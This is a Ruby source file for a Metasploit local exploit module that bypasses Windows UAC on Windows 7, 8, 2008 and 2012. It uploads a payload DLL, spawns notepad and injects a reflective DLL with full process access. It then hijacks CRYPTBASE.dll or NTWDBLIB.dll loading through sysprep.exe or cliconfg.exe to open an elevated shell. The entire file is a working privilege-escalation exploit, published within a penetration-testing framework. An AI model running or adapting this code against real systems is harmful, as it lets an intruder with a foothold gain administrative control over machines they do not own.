##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'msf/core/exploit/exe'

class Metasploit3 < Msf::Exploit::Local
  Rank = ExcellentRanking

  include Exploit::EXE
  include Exploit::FileDropper
  include Post::File
  include Post::Windows::Priv
  include Post::Windows::ReflectiveDLLInjection
  include Post::Windows::Runas

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Escalate UAC Protection Bypass (In Memory Injection)',
      'Description'   => %q{
        This module will bypass Windows UAC by utilizing the trusted publisher
        certificate through process injection. It will spawn a second shell that
        has the UAC flag turned off. This module uses the Reflective DLL Injection
        technique to drop only the DLL payload binary instead of three seperate
        binaries in the standard technique. However, it requires the correct
        architecture to be selected, (use x64 for SYSWOW64 systems also).
        If specifying EXE::Custom your DLL should call ExitProcess() after starting
        your payload in a seperate process.
      },
      'License'       => MSF_LICENSE,
      'Author'        => [
          'David Kennedy "ReL1K" <kennedyd013[at]gmail.com>',
          'mitnick',
          'mubix', # Port to local exploit
          'Ben Campbell', # In memory technique
          'Lesage', # Win8+ updates
          'OJ Reeves' # Win 8+ updates
        ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      'Targets'       => [
          [ 'Windows x86', { 'Arch' => ARCH_X86 } ],
          [ 'Windows x64', { 'Arch' => ARCH_X86_64 } ]
      ],
      'DefaultTarget' => 0,
      'References'    => [
        [
          'URL', 'http://www.trustedsec.com/december-2010/bypass-windows-uac/',
          'URL', 'http://www.pretentiousname.com/misc/W7E_Source/win7_uac_poc_details.html'
        ]
      ],
      'DisclosureDate'=> 'Dec 31 2010'
    ))

  end

  def exploit
    # Validate that we can actually do things before we bother
    # doing any more work
    validate_environment!
    check_permissions!

    # get all required environment variables in one shot instead. This
    # is a better approach because we don't constantly make calls through
    # the session to get the variables.
    env_vars = get_envs('TEMP', 'WINDIR')

    case get_uac_level
      when UAC_PROMPT_CREDS_IF_SECURE_DESKTOP,
        UAC_PROMPT_CONSENT_IF_SECURE_DESKTOP,
        UAC_PROMPT_CREDS, UAC_PROMPT_CONSENT
        fail_with(Exploit::Failure::NotVulnerable,
                  "UAC is set to 'Always Notify'\r\nThis module does not bypass this setting, exiting..."
        )
      when UAC_DEFAULT
        print_good('UAC is set to Default')
        print_good('BypassUAC can bypass this setting, continuing...')
      when UAC_NO_PROMPT
        print_warning('UAC set to DoNotPrompt - using ShellExecute "runas" method instead')
        shell_execute_exe
        return
    end

    dll_path = bypass_dll_path
    payload_filepath = "#{env_vars['TEMP']}//CRYPTBASE.EXE"
	#payload_filepath = "#{env_vars['TEMP']}\\#{rand_text_alpha(8)}.dll"

    upload_payload_dll(payload_filepath)

    pid = spawn_inject_proc(env_vars['WINDIR'])

    file_paths = get_file_paths(env_vars['WINDIR'], payload_filepath)
    run_injection(pid, dll_path, file_paths)

    # Windows 7 this is cleared up by DLL but on Windows
    # 8.1 it fails to delete the the file.
    register_file_for_cleanup(file_paths[:szElevDllFull])
  end

  def bypass_dll_path
    # path to the bypassuac binary
    path = ::File.join(Msf::Config.data_directory, 'post')

    # decide, x86 or x64
    sysarch = sysinfo['Architecture']
    if sysarch =~ /x64/i
      unless (target_arch.first =~ /64/i) && (payload_instance.arch.first =~ /64/i)
        fail_with(
            Exploit::Failure::BadConfig,
            'x86 Target Selected for x64 System'
        )
      end
      return ::File.join(path, 'bypassuac-x64-1.dll')
    else
      if (target_arch.first =~ /64/i) || (payload_instance.arch.first =~ /64/i)
        fail_with(
            Exploit::Failure::BadConfig,
            'x64 Target Selected for x86 System'
        )
      end

      return ::File.join(path, 'bypassuac-x86-1.dll')
    end
  end

  def check_permissions!
    # Check if you are an admin
    vprint_status('Checking admin status...')
    admin_group = is_in_admin_group?

    if admin_group.nil?
      print_error('Either whoami is not there or failed to execute')
      print_error('Continuing under assumption you already checked...')
    else
      if admin_group
        print_good('Part of Administrators group! Continuing...')
      else
        fail_with(Exploit::Failure::NoAccess, 'Not in admins group, cannot escalate with this module')
      end
    end

    if get_integrity_level == INTEGRITY_LEVEL_SID[:low]
      fail_with(Exploit::Failure::NoAccess, 'Cannot BypassUAC from Low Integrity Level')
    end
  end

  def run_injection(pid, dll_path, file_paths)
    vprint_status("Injecting #{datastore['DLL_PATH']} into process ID #{pid}")
    begin
      path_struct = create_struct(file_paths)

      vprint_status("Opening process #{pid}")
      host_process = client.sys.process.open(pid.to_i, PROCESS_ALL_ACCESS)
      exploit_mem, offset = inject_dll_into_process(host_process, dll_path)

      vprint_status("Injecting struct into #{pid}")
      struct_addr = host_process.memory.allocate(path_struct.length)
      host_process.memory.write(struct_addr, path_struct)

      vprint_status('Executing payload')
      thread = host_process.thread.create(exploit_mem + offset, struct_addr)
      print_good("Successfully injected payload in to process: #{pid}")
      client.railgun.kernel32.WaitForSingleObject(thread.handle, 14000)
    rescue Rex::Post::Meterpreter::RequestError => e
      print_error("Failed to Inject Payload to #{pid}!")
      vprint_error(e.to_s)
    end
  end

  # Create a process in the native architecture
  def spawn_inject_proc(win_dir)
    print_status('Spawning process with Windows Publisher Certificate, to inject into...')
    if sysinfo['Architecture'] =~ /wow64/i
      cmd = "#{win_dir}\\sysnative\\notepad.exe"
    else
      cmd = "#{win_dir}\\System32\\notepad.exe"
    end
    pid = cmd_exec_get_pid(cmd)

    unless pid
      fail_with(Exploit::Failure::Unknown, 'Spawning Process failed...')
    end

    pid
  end

  def upload_payload_dll(payload_filepath)
    payload = generate_payload_dll({:dll_exitprocess => true})
    print_status('Uploading the Payload DLL to the filesystem...')
    begin
      vprint_status("Payload DLL #{payload.length} bytes long being uploaded..")
      write_file(payload_filepath, payload)
      register_file_for_cleanup(payload_filepath)
    rescue Rex::Post::Meterpreter::RequestError => e
      fail_with(
          Exploit::Failure::Unknown,
          "Error uploading file #{payload_filepath}: #{e.class} #{e}"
      )
    end
  end

  def validate_environment!
    fail_with(Exploit::Failure::None, 'Already in elevated state') if is_admin? || is_system?

    winver = sysinfo['OS']

    case winver
    when /Windows (7|8|2008|2012)/
      print_good("#{winver} may be vulnerable.")
    else
      fail_with(Exploit::Failure::NotVulnerable, "#{winver} is not vulnerable.")
    end

    if is_uac_enabled?
      print_status('UAC is Enabled, checking level...')
    else
      unless is_in_admin_group?
        fail_with(Exploit::Failure::NoAccess, 'Not in admins group, cannot escalate with this module')
      end
    end
  end

  def get_file_paths(win_path, payload_filepath)
    paths = {}

    case sysinfo['OS']
    when /Windows (7|2008)/
      paths[:szElevDll] = 'CRYPTBASE.dll'
      paths[:szElevDir] = "#{win_path}\\System32\\sysprep"
      paths[:szElevDirSysWow64] = "#{win_path}\\sysnative\\sysprep"
      paths[:szElevExeFull] = "#{paths[:szElevDir]}\\sysprep.exe"
    when /Windows (8|2012)/
      paths[:szElevDll] = 'NTWDBLIB.dll'
      paths[:szElevDir] = "#{win_path}\\System32"
      # This should be fine to be left blank
      paths[:szElevDirSysWow64] = ''
      paths[:szElevExeFull] = "#{paths[:szElevDir]}\\cliconfg.exe"
    end

    paths[:szElevDllFull] = "#{paths[:szElevDir]}\\#{paths[:szElevDll]}"
    paths[:szTempDllPath] = payload_filepath

    paths
  end

  # Creates the paths struct which contains all the required paths
  # the dll needs to copy/execute etc.
  def create_struct(paths)

    # write each path to the structure in the order they
    # are defined in the bypass uac binary.
    struct = ''
    struct << fill_struct_path(paths[:szElevDir])
    struct << fill_struct_path(paths[:szElevDirSysWow64])
    struct << fill_struct_path(paths[:szElevDll])
    struct << fill_struct_path(paths[:szElevDllFull])
    struct << fill_struct_path(paths[:szElevExeFull])
    struct << fill_struct_path(paths[:szTempDllPath])

    struct
  end

  def fill_struct_path(path)
    path = Rex::Text.to_unicode(path)
    path + "\x00" * (520 - path.length)
  end

end

